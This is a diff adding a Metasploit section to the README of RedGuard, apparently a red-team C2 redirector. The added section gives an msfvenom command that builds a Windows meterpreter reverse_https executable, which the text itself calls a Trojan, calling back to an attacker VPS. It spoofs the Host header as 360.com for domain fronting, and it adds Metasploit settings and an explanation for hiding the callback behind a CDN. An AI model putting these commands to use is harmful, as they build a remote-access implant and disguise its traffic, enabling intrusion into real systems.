@@ -308,6 +308,33 @@ And because our basic verification is based on the HTTP HOST request header, wha
 
 For the listener settings, the online port is set to the RedGuard reverse proxy port, and the listening port is the actual online port of the local machine.
 
+## Metasploit
+
+**Generates Trojan**
+
+```bash
+$ msfvenom -p windows/meterpreter/reverse_https LHOST=vpsip LPORT=443 HttpHostHeader=360.com 
+-f exe -o ~/path/to/payload.exe
+```
+
+Of course, as a domain fronting scenario, you can also configure your LHOST to use any domain name of the manufacturer's CDN, and pay attention to setting the HttpHostHeader to match RedGuard.
+
+```bash
+setg OverrideLHOST 360.com
+setg OverrideLPORT 443
+setg OverrideRequestHost true
+```
+
+It is important to note that the `OverrideRequestHost` setting must be set to `true`. This is due to a quirk in the way Metasploit handles incoming HTTP/S requests by default when generating configuration for staging payloads. By default, Metasploit uses the incoming request's `Host` header value (if present) for second-stage configuration instead of the `LHOST` parameter. Therefore, the build stage is configured to send requests directly to your hidden domain name because CloudFront passes your internal domain in the `Host` header of forwarded requests. This is clearly not what we are asking for. Using the `OverrideRequestHost` configuration value, we can force Metasploit to ignore the incoming `Host` header and instead use the `LHOST` configuration value pointing to the origin CloudFront domain.
+
+The listener is set to the actual line port that matches the address RedGuard actually forwards to.
+
+![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/73315c83562826f16f64e2b277736c1.png)
+
+RedGuard received the request:
+
+![867551fe860b10ca1396498a85422b4.jpg](https://github.com/wikiZ/RedGuardImage/raw/main/159a00e6c5596bc3542701b4a8020b1.png)
+
 # 0x05 Loading
 
 Thank you for your support. RedGuard will continue to improve and update it. I hope that RedGuard can be known to more security practitioners. The tool refers to the design ideas of RedWarden.
